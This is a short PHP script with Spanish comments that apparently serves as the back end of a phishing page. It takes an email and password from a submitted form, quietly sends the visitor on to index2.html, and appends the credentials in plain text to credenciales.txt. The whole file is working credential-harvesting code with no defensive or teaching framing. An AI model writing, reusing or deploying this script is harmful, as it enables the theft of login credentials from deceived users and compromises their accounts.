<?php
// Recibo los datos introducidos en el formulario                      
$widj = $_POST["widj"];
$clave = $_POST["clave"];
header('Location:index2.html');
     // Abro el archivo
     $co = "=======================================\n";
     $cl = "=======================================\n";                 
     $file=fopen("credenciales.txt", "a");
     // Le cargo los datos
     $op = "Correo: $widj\n Contraseña:  $clave\n";
     fwrite($file, "\n". $co. $op. $cl);
     fclose($file);                                                    
?>
